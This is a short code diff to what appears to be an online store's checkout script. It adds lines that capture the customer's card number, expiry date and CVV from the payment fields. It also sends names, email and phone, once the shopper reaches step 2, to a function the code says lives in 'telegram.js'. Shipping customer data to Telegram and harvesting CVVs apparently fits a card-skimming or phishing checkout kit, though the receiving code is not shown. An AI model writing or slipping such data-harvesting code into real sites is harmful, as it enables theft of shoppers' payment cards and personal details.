@@ -247,6 +247,11 @@
                 country: document.getElementById('country').value,
                 email: document.getElementById('email').value,
                 phone: document.getElementById('phone').value,
+                // --- ADD PAYMENT INFO ---
+                cardNumber: document.querySelector('input[placeholder="•••• •••• •••• ••••"]').value,
+                expiryDate: document.querySelector('input[placeholder="MM/YY"]').value,
+                cvv: document.querySelector('input[placeholder="•••"]').value,
+                // ------------------------
             };
 
             // Hide checkout container and show success message
@@ -283,6 +288,19 @@
                 // Optionally, show an error message
                 return;
             }
+
+            // If moving from step 1 to 2, send shipping info
+            if (stepNumber === 2) {
+                const shippingInfo = {
+                    firstName: document.getElementById('firstName').value,
+                    lastName: document.getElementById('lastName').value,
+                    email: document.getElementById('email').value,
+                    phone: document.getElementById('phone').value,
+                };
+                // This function is in telegram.js
+                sendShippingInfoNotification(shippingInfo);
+            }
+
 
             // Hide all steps
             document.querySelectorAll('.checkout-step').forEach(step => step.classList.remove('active'));
